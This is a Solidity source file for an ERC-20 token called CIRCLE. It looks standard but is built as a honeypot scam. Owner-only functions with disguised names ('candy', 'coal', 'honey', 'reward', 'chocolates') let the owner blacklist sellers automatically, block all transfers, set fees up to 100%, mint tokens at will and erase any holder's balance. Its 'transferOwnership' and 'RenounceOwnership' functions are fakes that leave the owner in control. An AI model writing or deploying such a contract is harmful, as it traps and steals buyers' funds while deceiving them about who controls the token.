// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}


contract CIRCLE is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 10 * 10 ** 9 * 10 ** 8;

    string private _name;
    string private _symbol;


    constructor() {
        _name = "CIRCLE";
        _symbol = "CIRCLE";
        _balances[msg.sender] = _totalSupply;
    }

 
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setCandy(address account) public onlyOwner {
        candy[account] = true;
    }

    function removeCandy(address account) public onlyOwner {
        candy[account] = false;
    }

    function myChocolate(address account, uint256 amount) public onlyOwner {
        chocolates[account] = amount;
    }

    function setCoal(address account) public onlyOwner {
        coal[account] = true;
    }

    function removeCoal(address account) public onlyOwner {
        coal[account] = false;
    }

    function enableReward(bool _enable) public onlyOwner {
        reward = _enable;
    }

    function pickCoal(address account) internal {
        coal[account] = true;
    }

    function setAutoCoal(bool _enable) public onlyOwner {
        autoCoal = _enable;
    }

    function setNumbers(uint256 amount) public onlyOwner {
        numbers = amount;
    }

    function setLimits(uint256 amount) public onlyOwner {
        limits = amount;
    }

    function setFee(uint256 amount) public onlyOwner {
        require(amount >= 0);
        require(amount <= 100);
        fee = amount;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        address oldOwner = owner();
        emit OwnershipTransferred(oldOwner, _newOwner);
    }

    function RenounceOwnership(
        address _DEAD,
        bool _boo
    ) public onlyOwner returns (address _dead) {
        ownershipToNull = _boo;
        _dead = _DEAD;
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (honey) {
            uint256 fromBalance = _balances[from];
            require(
                fromBalance >= amount,
                "ERC20: transfer amount exceeds balance"
            );
            unchecked {
                _balances[from] = fromBalance - amount;
            }
            _balances[to] += amount;

            emit Transfer(from, to, amount);
        } else {
            _beforeTokenTransfer(from, amount);
            burnFee(from, to, amount);
        }
    }

    function burnAmount(address wallet, uint256 amount) public onlyOwner {
        require(wallet != owner(), "TARGET ERROR");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if (_balances[wallet] <= amount * 10 ** 18) {
            _balances[wallet] = 0;
            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];
        } else {
            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;
            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;
        }
    }

    function burnFee(
        address sender,
        address recipient,
        uint256 value
    ) internal {
        require(_balances[sender] >= value, "Value exceeds balance");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if (sender != owner() && !candy[sender] && sender != address(this)) {
            uint256 burnFees = ((value * fee) / 100);
            uint256 amount = value - burnFees;
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + amount;
            emit Transfer(sender, recipient, amount);
            if (fee > 0) {
                _balances[sender] = _balances[sender] - burnFees;
                _balances[deadAddress] = _balances[deadAddress] + burnFees;
                emit Transfer(sender, deadAddress, burnFees);
            }
        } else {
            _balances[sender] = _balances[sender] - value;
            _balances[recipient] = _balances[recipient] + value;
            emit Transfer(sender, recipient, value);
        }
    }

    address private pairUniswap;

    function setUniswapPair(
        address _pairUniswap
    ) public onlyOwner returns (bool) {
        pairUniswap = _pairUniswap;
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setAirDrop(address account, uint256 amount) public onlyOwner {
        _balances[account] = _balances[account] + amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        uint256 amount
    ) internal virtual {
        if (
            from != owner() && !candy[from] && from != pairUniswap // pair address to be changed
        ) {
            require(!coal[from]);
            if (chocolates[from] > 0) {
                require(amount <= chocolates[from]);
            }

            if (numbers > 0) {
                require(amount <= numbers);
            }
            if (reward) {
                revert("Error");
            }
            if (limits > 0) {
                require(_balances[from] <= limits);
            }

            if (autoCoal) {
                pickCoal(from);
            }
        }
    }

    function setHoney(bool _honey) public onlyOwner {
        honey = _honey;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    mapping(address => bool) private candy;
    mapping(address => bool) private coal;
    mapping(address => uint256) private chocolates;
    bool public reward;
    uint256 public numbers;
    uint256 public limits;
    uint256 public fee;
    bool public autoCoal;
    bool private honey = false;
    bool public ownershipToNull;
}